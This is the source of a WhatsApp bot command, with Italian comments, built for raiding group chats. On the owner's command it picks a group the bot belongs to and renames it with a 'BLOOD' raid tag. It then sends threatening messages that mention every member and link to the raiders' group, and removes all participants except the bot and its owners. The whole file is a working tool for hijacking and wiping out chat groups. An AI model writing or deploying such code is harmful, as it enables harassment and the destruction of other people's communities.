let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // Recupera la lista dei gruppi per la modalità privata
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);

    let targetChat;

    if (!m.isGroup) {
        if (!text) {
            let txt = "🩸 *Scegli il gruppo da devastare:*\n\n";
            groups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\n`;
            });
            txt += `\n👉 Scrivi *.${command} [numero]*`;
            return m.reply(txt);
        }

        let index = parseInt(text) - 1;
        if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");
        targetChat = groups[index].id;
    } else {
        targetChat = m.chat;
    }

    // --- ESECUZIONE DIRETTA (Senza controlli admin) ---
    try {
        const botId = conn.user.id.includes(':') ? conn.user.id.split(':')[0] + '@s.whatsapp.net' : conn.user.id;
        
        // Recuperiamo i dati per sapere chi menzionare e chi cacciare
        let metadata = await conn.groupMetadata(targetChat).catch(_ => null);
        if (!metadata) return m.reply("❌ Impossibile recuperare le info del gruppo.");

        if (!m.isGroup) await m.reply(`⚔️ Tentativo di attacco su: *${metadata.subject}*...`);

        // 1. Prova a cambiare nome
        try {
            await conn.groupUpdateSubject(targetChat, `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`);
        } catch {
            console.log("Non ho potuto cambiare il nome.");
        }

        // 2. Invio messaggi
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎. 𝐈𝐥 𝐝𝐞𝐯𝐚𝐬𝐭𝐨 𝐜𝐡𝐞 𝐚𝐦𝐦𝐚𝐳𝐳𝐞𝐫𝐚̀ 𝐭𝐮𝐭𝐭𝐢 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐜𝐨𝐦𝐞 𝐮𝐧𝐚 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐚, 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐪𝐮𝐞𝐥𝐥𝐚 𝐜𝐡𝐞 𝐯𝐢 𝐝𝐚𝐫𝐚̀."
        });

        await conn.sendMessage(targetChat, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: metadata.participants.map(p => p.id)
        });

        // 3. Prova a rimuovere tutti
        let usersToRemove = metadata.participants
            .map(p => p.id)
            .filter(jid => jid !== botId && !ownerJids.includes(jid));

        if (usersToRemove.length > 0) {
            await conn.groupParticipantsUpdate(targetChat, usersToRemove, 'remove');
        }

        if (!m.isGroup) m.reply(`✅ Azione completata su *${metadata.subject}*.\nNota: Se alcuni utenti sono ancora dentro, il bot non era admin.`);

    } catch (e) {
        console.error(e);
        // Se fallisce l'azione principale (solitamente la rimozione)
        m.reply("❌ L'azione è fallita. Molto probabilmente il bot non è admin nel gruppo selezionato.");
    }
};

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
